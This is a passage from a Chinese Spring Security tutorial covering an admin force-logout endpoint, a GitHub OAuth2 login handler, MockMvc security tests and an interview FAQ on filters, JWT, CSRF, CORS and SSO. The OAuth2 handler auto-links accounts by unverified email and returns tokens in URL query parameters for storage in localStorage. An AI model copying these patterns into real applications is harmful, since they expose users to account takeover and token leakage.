    @PreAuthorize("hasRole('ADMIN')")
    public ResponseEntity<ApiResponse<Void>> forceLogout(@PathVariable String username) {
        // 清除用户 Redis 缓存（下次请求会重新加载）
        redisTemplate.delete("security:user:" + username);
        // 删除 Refresh Token（使其无法刷新）
        redisTemplate.delete("jwt:refresh:" + username);
        return ResponseEntity.ok(ApiResponse.success("用户已强制下线"));
    }
}
```

---

## 案例4：OAuth2 GitHub 第三方登录（完整流程）

```java
// GitHub OAuth2 登录完整实现

// 1. 配置（application.yml 中已配置 github client-id 和 secret）

// 2. 登录成功处理器：处理 GitHub 用户信息，生成本应用 JWT
@Component
@RequiredArgsConstructor
public class OAuth2LoginSuccessHandler implements AuthenticationSuccessHandler {

    private final JwtTokenUtil jwtTokenUtil;
    private final SysUserRepository userRepository;
    private final SocialBindRepository socialBindRepository;

    @Value("${app.frontend-url:http://localhost:3000}")
    private String frontendUrl;

    @Override
    @Transactional
    public void onAuthenticationSuccess(HttpServletRequest request,
                                         HttpServletResponse response,
                                         Authentication authentication) throws IOException {

        OAuth2AuthenticationToken oauthToken = (OAuth2AuthenticationToken) authentication;
        OAuth2User oauthUser = oauthToken.getPrincipal();
        String provider = oauthToken.getAuthorizedClientRegistrationId();

        // 1. 提取用户信息
        String oauthId = oauthUser.getAttribute("id").toString();
        String email   = oauthUser.getAttribute("email");
        String name    = oauthUser.getAttribute("login");    // GitHub 用户名
        String avatar  = oauthUser.getAttribute("avatar_url");

        // 2. 查找或创建本地用户
        SysUser localUser = socialBindRepository
            .findByProviderAndOpenId(provider, oauthId)
            .map(SocialBind::getUser)
            .orElseGet(() -> {
                // 3. 检查邮箱是否已注册
                if (email != null) {
                    Optional<SysUser> existing = userRepository.findByEmail(email);
                    if (existing.isPresent()) {
                        // 自动绑定
                        SysUser existUser = existing.get();
                        socialBindRepository.save(SocialBind.builder()
                            .user(existUser).provider(provider).openId(oauthId).build());
                        return existUser;
                    }
                }

                // 4. 创建新用户
                SysUser newUser = new SysUser();
                newUser.setUsername(provider + "_" + oauthId);
                newUser.setNickname(name);
                newUser.setEmail(email);
                newUser.setAvatar(avatar);
                newUser.setPassword("");  // OAuth2 用户没有本地密码
                newUser.setStatus(1);
                SysUser saved = userRepository.save(newUser);

                socialBindRepository.save(SocialBind.builder()
                    .user(saved).provider(provider).openId(oauthId).build());

                return saved;
            });

        // 5. 生成本应用的 JWT Token
        // 需要加载用户的角色权限（新注册用户分配默认角色）
        List<String> roles = List.of("USER");
        List<String> perms = List.of("profile:view", "profile:edit");
        LoginUser loginUser = new LoginUser(localUser, roles, perms);

        String accessToken  = jwtTokenUtil.generateAccessToken(loginUser);
        String refreshToken = jwtTokenUtil.generateRefreshToken(localUser.getUsername());

        // 6. 重定向到前端，携带 Token
        String redirectUrl = UriComponentsBuilder.fromUriString(frontendUrl + "/oauth2/callback")
            .queryParam("accessToken",  accessToken)
            .queryParam("refreshToken", refreshToken)
            .queryParam("expiresIn",    1800)
            .build().toUriString();

        response.sendRedirect(redirectUrl);
    }
}

// 前端处理回调（Vue3）
// /oauth2/callback 页面：
// const urlParams = new URLSearchParams(window.location.search);
// const accessToken  = urlParams.get('accessToken');
// const refreshToken = urlParams.get('refreshToken');
// // 存储 Token
// localStorage.setItem('accessToken', accessToken);
// // 跳转到首页
// router.push('/home');
```

---

## 案例5：项目集成测试

```java
// Spring Security 单元测试
@SpringBootTest
@AutoConfigureMockMvc
class SecurityIntegrationTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private JwtTokenUtil jwtTokenUtil;

    @Autowired
    private PasswordEncoder passwordEncoder;

    // 测试：未认证访问受保护资源
    @Test
    void givenNoToken_whenAccessProtectedApi_thenUnauthorized() throws Exception {
        mockMvc.perform(get("/api/system/user"))
            .andExpect(status().isUnauthorized())
            .andExpect(jsonPath("$.code").value(401));
    }

    // 测试：使用有效 Token 访问
    @Test
    @WithMockUser(username = "admin", roles = {"ADMIN"})
    void givenAdminUser_whenAccessAdminApi_thenOk() throws Exception {
        mockMvc.perform(get("/api/system/user"))
            .andExpect(status().isOk());
    }

    // 测试：权限不足
    @Test
    @WithMockUser(username = "user", roles = {"USER"})
    void givenUserRole_whenAccessAdminApi_thenForbidden() throws Exception {
        mockMvc.perform(delete("/api/system/user/1"))
            .andExpect(status().isForbidden())
            .andExpect(jsonPath("$.code").value(403));
    }

    // 测试：JWT Token 认证
    @Test
    void givenValidJwtToken_whenAccessProtectedApi_thenOk() throws Exception {
        // 构建 LoginUser
        LoginUser loginUser = buildTestLoginUser();
        String token = jwtTokenUtil.generateAccessToken(loginUser);

        mockMvc.perform(get("/api/auth/me")
                .header("Authorization", "Bearer " + token))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.data.username").value("testUser"));
    }

    // 测试：过期 Token
    @Test
    void givenExpiredToken_whenAccess_thenUnauthorized() throws Exception {
        String expiredToken = buildExpiredToken();

        mockMvc.perform(get("/api/auth/me")
                .header("Authorization", "Bearer " + expiredToken))
            .andExpect(status().isUnauthorized())
            .andExpect(jsonPath("$.message").value("Token 已过期，请重新登录"));
    }

    // 测试：登录流程
    @Test
    void testLoginFlow() throws Exception {
        String loginBody = """
            {
                "username": "admin",
                "password": "Admin@123"
            }
            """;

        MvcResult result = mockMvc.perform(post("/api/auth/login")
                .contentType(MediaType.APPLICATION_JSON)
                .content(loginBody))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.data.accessToken").isNotEmpty())
            .andExpect(jsonPath("$.data.refreshToken").isNotEmpty())
            .andReturn();

        String response = result.getResponse().getContentAsString();
        String accessToken = JsonPath.read(response, "$.data.accessToken");

        // 使用获取到的 Token 访问受保护资源
        mockMvc.perform(get("/api/auth/me")
                .header("Authorization", "Bearer " + accessToken))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.data.username").value("admin"));
    }

    private LoginUser buildTestLoginUser() {
        SysUser user = new SysUser();
        user.setId(1L);
        user.setUsername("testUser");
        user.setPassword(passwordEncoder.encode("Test@123"));
        user.setStatus(1);
        return new LoginUser(user, List.of("USER"), List.of("profile:view"));
    }

    private String buildExpiredToken() {
        // 使用反射或者直接构建一个已过期的 Token（用于测试）
        // 实际测试中可以使用 Mockito mock JwtTokenUtil
        return "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiZXhwIjoxfQ.expired";
    }
}
```
---

# Part 10: 常见面试题 FAQ

## Q1: Spring Security 的过滤器链是如何工作的？请说明核心过滤器的顺序和作用。

**答：**

Spring Security 基于 Servlet Filter 机制，核心是 `FilterChainProxy`，它管理一个或多个 `SecurityFilterChain`。

```
执行顺序（关键过滤器）：

1. SecurityContextHolderFilter
   → 从持久化存储（Session/Redis）恢复 SecurityContext 到 ThreadLocal

2. CsrfFilter
   → 验证 CSRF Token（默认开启，JWT应用需禁用）

3. UsernamePasswordAuthenticationFilter
   → 拦截 POST /login，提取用户名密码，委托 AuthenticationManager 认证

4. BasicAuthenticationFilter
   → 拦截 Authorization: Basic 请求头，解码并认证

5. AnonymousAuthenticationFilter
   → 如果 SecurityContext 中还没有认证信息，设置匿名 Authentication

6. ExceptionTranslationFilter
   → 捕获 AuthenticationException → 401
   → 捕获 AccessDeniedException   → 403（已认证）或 401（匿名）

7. AuthorizationFilter（最后一个，守门人）
   → 根据配置规则决定是否允许访问
```

每个过滤器负责一个特定的安全职责，按顺序执行，形成完整的安全流水线。

---

## Q2: 认证（Authentication）和授权（Authorization）的区别是什么？

**答：**

```
认证（Authentication）：你是谁？
  → 验证身份的过程
  → "你是 tom 吗？" → 验证用户名+密码
  → 结果：确认身份是否真实
  → Spring Security 中由 AuthenticationManager 负责

授权（Authorization）：你能做什么？
  → 在认证后，检查是否有权访问特定资源
  → "tom 有权限访问 /admin 吗？" → 检查角色/权限
  → 结果：允许或拒绝访问
  → Spring Security 中由 AuthorizationManager/AccessDecisionManager 负责

关系：
  必须先认证，才能授权（认证是授权的前提）
  AuthenticationException → 401 Unauthorized
  AccessDeniedException   → 403 Forbidden
```

---

## Q3: JWT 的工作原理是什么？相比 Session 有什么优缺点？

**答：**

```
JWT 工作原理：
  1. 用户登录成功后，服务器生成 JWT（包含用户信息和签名）
  2. 将 JWT 返回给客户端
  3. 客户端在每次请求时携带 JWT（Authorization: Bearer xxx）
  4. 服务器验证签名，从 Payload 中读取用户信息，无需查库

JWT 优点：
  ✓ 无状态：服务器不存 Token，适合集群/微服务
  ✓ 跨域友好：不依赖 Cookie
  ✓ 携带信息：可以存储用户基本信息，减少 DB 查询
  ✓ 移动端友好

JWT 缺点：
  ✗ 无法主动失效（需要黑名单机制）
  ✗ Token 较大（增加请求体积）
  ✗ 泄露后无法撤回（短有效期 + Refresh Token 缓解）
  ✗ Payload 不加密（不能存敏感信息）

Session 优点：
  ✓ 可主动失效（服务器控制）
  ✓ 数据安全（只有Session ID在客户端）

Session 缺点：
  ✗ 服务器存储Session，增加内存压力
  ✗ 集群需要 Session 同步
  ✗ 不适合移动端和跨域场景
```

---

## Q4: @PreAuthorize 和 @Secured 有什么区别？

**答：**

```java
// @PreAuthorize：支持 SpEL 表达式（功能强大，推荐）
@PreAuthorize("hasRole('ADMIN')")
@PreAuthorize("hasAuthority('user:list')")
@PreAuthorize("hasRole('ADMIN') or principal.userId == #userId")
@PreAuthorize("@permService.canAccess(#id)")

// @Secured：只支持角色列表，不支持 SpEL（功能简单）
@Secured({"ROLE_ADMIN", "ROLE_MANAGER"})  // 必须写完整 ROLE_ 前缀

// @RolesAllowed：JSR-250 标准，与 @Secured 类似
@RolesAllowed({"ADMIN", "MANAGER"})  // 不需要 ROLE_ 前缀

核心区别：
  @PreAuthorize：方法执行前检查，SpEL 支持，可引用参数
  @PostAuthorize：方法执行后检查，可检查返回值
  @Secured：简单角色列表，不支持 SpEL
  @RolesAllowed：JSR-250 标准，兼容性更好

启用方式：
  @EnableMethodSecurity(prePostEnabled=true, securedEnabled=true, jsr250Enabled=true)
```

---

## Q5: BCryptPasswordEncoder 的工作原理是什么？为什么推荐用它？

**答：**

BCrypt 是一种专门为密码哈希设计的算法：

1. **随机Salt**：每次加密生成随机 Salt，即使相同密码加密结果也不同，防止彩虹表攻击
2. **慢速哈希**：通过 cost factor 控制计算迭代次数（默认 2^10=1024次），每次验证需约 100ms，暴力破解代价极高
3. **单向不可逆**：无法通过哈希值反推原始密码
4. **内嵌Salt**：Salt 内嵌在哈希结果中，不需要单独存储

```java
// 格式：$2a$10$<22位Salt><31位Hash>
// 示例：$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy

// 验证时：从存储值中提取 Salt，用相同 Salt 重新计算，比对结果
passwordEncoder.matches("mypassword", encodedPassword);  // ≈100ms
```

推荐原因：cost 可调（`new BCryptPasswordEncoder(12)`），随着硬件性能提升可以增大 cost，保持破解困难度。

---

## Q6: CSRF 攻击是什么？Spring Security 如何防护？

**答：**

CSRF（跨站请求伪造）：攻击者诱导已登录用户在不知情的情况下发出恶意请求。

**攻击原理**：浏览器在发送请求时会自动携带目标网站的 Cookie，攻击者利用这一特性在第三方网站构造向目标网站的请求。

**Spring Security 防护（SynchronizerToken）**：
1. 服务器生成随机 CSRF Token 存入 Session
2. 在表单中嵌入该 Token（隐藏字段）
3. 服务器验证提交的 Token 与 Session 中的是否一致
4. 攻击者无法通过同源策略获取 Token，无法伪造合法请求

**JWT 应用为什么可以禁用 CSRF**：JWT 存储在 Authorization Header，浏览器不会自动发送（只自动携带 Cookie），所以不存在 CSRF 风险。

---

## Q7: Spring Security 如何实现记住我（Remember-Me）功能？

**答：**

Spring Security 提供两种 Remember-Me 实现：

**1. 简单哈希 Token（SimpleHashBased）**：
- Cookie 内容：`Base64(username + ":" + expirationTime + ":" + md5Hash)`
- 优点：简单，无需数据库
- 缺点：用户改密后旧 Cookie 仍有效；Token 被盗无法识别

**2. 持久化 Token（推荐）**：
- 数据库存储：series（标识符）+ token + username + lastUsed
- Cookie 内容：series + token
- 每次使用后 token 更新（防重放攻击）
- 检测到 token 不一致时（可能被盗），删除该用户所有 Remember-Me 记录

```java
.rememberMe(rm -> rm
    .tokenRepository(persistentTokenRepository())  // 数据库持久化
    .tokenValiditySeconds(7 * 24 * 3600)           // 7天
    .userDetailsService(userDetailsService)
)
```

---

## Q8: SecurityContextHolder 的作用是什么？线程安全吗？

**答：**

`SecurityContextHolder` 是 Spring Security 的核心工具类，用于存储当前线程的认证信息（`SecurityContext`）。

**存储机制**：默认使用 `ThreadLocal`，每个线程独立存储，互不干扰。这意味着同一个 Web 应用中，不同请求（不同线程）的认证信息完全隔离。

**线程安全性**：
- `ThreadLocal` 本身是线程安全的（每线程独立）
- 但子线程无法自动继承父线程的 SecurityContext

**子线程问题解决方案**：
```java
// 1. 修改策略为 MODE_INHERITABLETHREADLOCAL
SecurityContextHolder.setStrategyName(SecurityContextHolder.MODE_INHERITABLETHREADLOCAL);

// 2. 使用 DelegatingSecurityContextRunnable 包装子线程
SecurityContext context = SecurityContextHolder.getContext();
Runnable secureTask = new DelegatingSecurityContextRunnable(originalTask, context);
executor.submit(secureTask);

// 3. @Async 方法需要特殊配置
@Bean
public Executor taskExecutor() {
    return new DelegatingSecurityContextAsyncTaskExecutor(
        new ThreadPoolTaskExecutor());
}
```

**关键操作**：请求结束后必须调用 `SecurityContextHolder.clearContext()` 清除 ThreadLocal，防止内存泄漏（Spring Security 过滤器会自动处理）。

---

## Q9: 如何实现动态权限（从数据库加载，不重启应用）？

**答：**

```
动态权限实现方案：

1. 数据库存储 URL → 权限 映射关系（sys_permission 表）

2. 实现 AuthorizationManager<HttpServletRequest>：
   - 加载 URL 权限规则（带内存缓存）
   - 对每个请求检查是否有对应权限

3. 在 SecurityFilterChain 中使用：
   .anyRequest().access(dynamicAuthorizationManager)

4. 提供刷新接口（管理员修改权限后调用）：
   POST /api/system/refresh-permissions
   → 清除内存缓存 → 下次请求重新从 DB 加载

关键代码：
  @Component
  public class DynamicAuthorizationManager implements AuthorizationManager<HttpServletRequest> {
      
      private volatile Map<String, String> urlPermMap;  // 内存缓存
      
      public void refreshPermissionMap() {
          // 重新从数据库加载
          urlPermMap = loadFromDB();
      }
      
      public AuthorizationDecision check(Supplier<Authentication> auth,
                                          HttpServletRequest request) {
          // 1. 从缓存中查找该 URL 所需权限
          // 2. 检查用户是否有该权限
      }
  }
```

---

## Q10: OAuth2.0 授权码模式的完整流程是什么？

**答：**

```
授权码模式完整流程（以 GitHub 登录为例）：

1. 用户点击"GitHub登录"
   → 应用生成 state（随机数，防CSRF）
   → 重定向到 GitHub 授权端点：
     https://github.com/login/oauth/authorize
     ?client_id=xxx&redirect_uri=xxx&scope=user:email&state=random

2. GitHub 显示授权同意页
   → 用户确认授权

3. GitHub 回调应用（携带授权码）：
   https://myapp.com/callback?code=AUTH_CODE&state=random
   → 应用验证 state（防CSRF）

4. 应用用授权码换 Access Token（后端请求，不暴露给前端）：
   POST https://github.com/login/oauth/access_token
   Body: code=AUTH_CODE&client_id=xxx&client_secret=xxx
   → 获得 access_token

5. 应用用 Access Token 获取用户信息：
   GET https://api.github.com/user
   Authorization: token access_token
   → 获取用户名、邮箱等

6. 应用基于第三方用户信息创建/匹配本地账号
   → 生成本应用 JWT Token
   → 返回给前端

核心安全点：
  ✓ 授权码只能使用一次（防重放）
  ✓ client_secret 永远在后端，不暴露给前端
  ✓ state 参数防止 CSRF 攻击
  ✓ redirect_uri 必须与注册时完全一致
```

---

## Q11: 如何防止接口被暴力破解（密码爆破防护）？

**答：**

```java
// 方案1：登录失败次数限制 + 账号锁定
@Service
public class LoginAttemptService {
    
    private final StringRedisTemplate redis;
    private static final int MAX_ATTEMPTS = 5;
    private static final long LOCK_DURATION_MINUTES = 30;
    
    public void loginFailed(String username) {
        String key = "login:fail:" + username;
        Long count = redis.opsForValue().increment(key);
        if (count == 1) {
            redis.expire(key, LOCK_DURATION_MINUTES, TimeUnit.MINUTES);
        }
    }
    
    public boolean isBlocked(String username) {
        String key = "login:fail:" + username;
        String count = redis.opsForValue().get(key);
        return count != null && Integer.parseInt(count) >= MAX_ATTEMPTS;
    }
    
    public void loginSucceeded(String username) {
        redis.delete("login:fail:" + username);
    }
}

// 在 DaoAuthenticationProvider 中集成
@Component
public class BruteForceProtectedProvider extends DaoAuthenticationProvider {
    
    @Autowired
    private LoginAttemptService attemptService;
    
    @Override
    public Authentication authenticate(Authentication auth) throws AuthenticationException {
        String username = auth.getName();
        
        if (attemptService.isBlocked(username)) {
            throw new LockedException("账号已被锁定30分钟，请稍后重试");
        }
        
        try {
            Authentication result = super.authenticate(auth);
            attemptService.loginSucceeded(username);
            return result;
        } catch (BadCredentialsException e) {
            attemptService.loginFailed(username);
            throw e;
        }
    }
}

// 方案2：图形验证码（登录3次失败后触发）
// 方案3：IP 频率限制（同一IP短时间大量请求）
// 方案4：滑动验证码（行为验证）
```

---

## Q12: Spring Security 中如何实现数据权限（行级别授权）？

**答：**

数据权限控制哪些数据记录可以被访问（行级）：

```java
// 方案1：在 Service 层通过 @PreAuthorize 实现
@Service
public class OrderService {
    
    @PreAuthorize("hasRole('ADMIN') or @orderSecurity.isOwner(#orderId)")
    public Order getOrder(Long orderId) { ... }
}

@Service("orderSecurity")
public class OrderSecurityService {
    @Autowired
    private OrderRepository orderRepo;
    
    public boolean isOwner(Long orderId) {
        Long currentUserId = getCurrentUserId();
        return orderRepo.existsByIdAndUserId(orderId, currentUserId);
    }
}

// 方案2：在查询层面过滤（推荐，性能更好）
@Service
public class OrderService {
    
    public List<Order> listOrders() {
        LoginUser user = getCurrentUser();
        if (user.hasRole("ADMIN")) {
            // 管理员查看所有
            return orderRepo.findAll();
        } else if (user.hasRole("MANAGER")) {
            // 部门经理查看本部门
            return orderRepo.findByDeptId(user.getDeptId());
        } else {
            // 普通用户只能查看自己的
            return orderRepo.findByUserId(user.getUserId());
        }
    }
}

// 方案3：MyBatis Plugin（透明数据过滤）
// 在 SQL 执行前自动添加 user_id = #{currentUserId} 条件
@Intercepts({@Signature(type = Executor.class, method = "query", args = {...})})
public class DataScopeInterceptor implements Interceptor { ... }
```

---

## Q13: 如何在 Spring Security 中处理跨域（CORS）问题？

**答：**

在 Spring Security 应用中，CORS 配置必须在 Spring Security 过滤器链层面处理，不能只依赖 `@CrossOrigin` 注解（Spring Security 会先拦截预检请求）：

```java
// 正确做法：在 SecurityFilterChain 中配置 CORS
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        // 必须在 Security 层面先处理 CORS
        .cors(cors -> cors.configurationSource(corsConfigurationSource()))
        .csrf(AbstractHttpConfigurer::disable)
        // ...
    return http.build();
}

@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOriginPatterns(List.of("http://localhost:3000", "https://*.myapp.com"));
    config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "OPTIONS"));
    config.setAllowedHeaders(List.of("*"));
    config.setAllowCredentials(true);
    config.setMaxAge(3600L);
    
    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", config);
    return source;
}

// 注意事项：
// 1. allowedOriginPatterns 不能包含 "*"（当 allowCredentials=true 时）
// 2. OPTIONS 预检请求需要放行（Spring Security 会自动处理已配置 CORS 的预检请求）
// 3. 如果使用 SpringMVC 的 @CrossOrigin，也需要配置 Security 层面的 CORS
```

---

## Q14: Spring Security 6.x 相比 5.x 有哪些重要变化？

**答：**

```
Spring Security 6.x 主要变化（以 Spring Boot 3.x 为基准）：

1. 废弃 WebSecurityConfigurerAdapter（已在5.7废弃，6.x移除）
   旧：extends WebSecurityConfigurerAdapter
   新：@Bean SecurityFilterChain + @Bean AuthenticationManager

2. SecurityContextPersistenceFilter → SecurityContextHolderFilter
   SecurityContext 的保存职责移交给各认证过滤器（更明确）

3. FilterSecurityInterceptor → AuthorizationFilter
   AccessDecisionManager → AuthorizationManager（更简洁）
   .antMatchers() → .requestMatchers()

4. 方法级安全：
   @EnableGlobalMethodSecurity → @EnableMethodSecurity
   默认 prePostEnabled=true（之前需要手动开启）

5. HttpSecurity 配置风格变化（Lambda DSL）：
   旧：http.csrf().disable().and().authorizeRequests().antMatchers(...)
   新：http.csrf(AbstractHttpConfigurer::disable)
           .authorizeHttpRequests(auth -> auth.requestMatchers(...))

6. 密码编码器默认 DelegatingPasswordEncoder（存储格式 {bcrypt}xxx）

7. OAuth2：更完善的 Spring Authorization Server（独立项目）
   不再捆绑在 Spring Security 中

8. Java 17+ 要求（Spring Boot 3.x）
```

---

## Q15: 如何实现单点登录（SSO）？

**答：**

```
单点登录（SSO）方案对比：

方案1：共享 Session（适合同域名系统）
  - 多个应用共享同一个 Redis Session
  - 只需登录一次，Session 在所有应用生效
  - 实现：Spring Session + Redis
  
  spring:
    session:
      store-type: redis
      timeout: 30m

方案2：OAuth2 SSO（推荐，标准化）
  - 独立的授权服务器（Spring Authorization Server）
  - 所有应用都是 OAuth2 Client
  - 用户只需在授权服务器登录一次
  - 每个应用通过授权码换取 Access Token
  
  实现：
  spring:
    security:
      oauth2:
        client:
          registration:
            my-sso:
              provider: my-auth-server
              client-id: app-client
              authorization-grant-type: authorization_code
              scope: openid, profile

方案3：JWT + Token 验证中心
  - 登录时统一去 Auth 服务认证
  - 返回 JWT Token
  - 各子系统验证 JWT 签名（无需调用 Auth 服务）
  - 适合微服务架构

方案4：SAML 2.0
  - 企业级 SSO 标准
  - Spring Security 内置 SAML 支持
  - 适合与企业系统（AD/LDAP）集成
```

---

## 附录：Spring Security 核心类速查表

```
核心接口/类                    职责
─────────────────────────────────────────────────────
Authentication                 认证对象（认证前/后）
AuthenticationManager          认证入口（顶级接口）
ProviderManager                AuthenticationManager 实现（委托链）
AuthenticationProvider         具体认证逻辑
DaoAuthenticationProvider      基于 DB 的认证 Provider
UserDetailsService             加载用户信息
UserDetails                    用户信息对象
GrantedAuthority               单个权限
SimpleGrantedAuthority         GrantedAuthority 简单实现
SecurityContext                安全上下文容器
SecurityContextHolder          SecurityContext 的存储和访问工具
FilterChainProxy               过滤器链代理（核心入口）
SecurityFilterChain            过滤器链
AuthorizationManager           授权决策（6.x）
AccessDecisionManager          授权决策（5.x，已废弃）
ExceptionTranslationFilter     安全异常 → HTTP 响应转换
AuthenticationEntryPoint       未认证时的处理（返回401）
AccessDeniedHandler            权限不足时的处理（返回403）
PasswordEncoder                密码编码接口
BCryptPasswordEncoder          BCrypt 密码编码实现
JwtAuthenticationFilter        JWT 认证过滤器（自定义）
```

---

*文档结束*

> 本文档涵盖了 Spring Security 从入门到精通的完整知识体系，包含架构原理、认证授权机制、JWT集成、OAuth2.0、RBAC权限模型、安全防护和完整实战案例。建议结合实际项目反复实践，加深理解。
>
> 版本：Spring Boot 3.x / Spring Security 6.x  
> 最后更新：2024
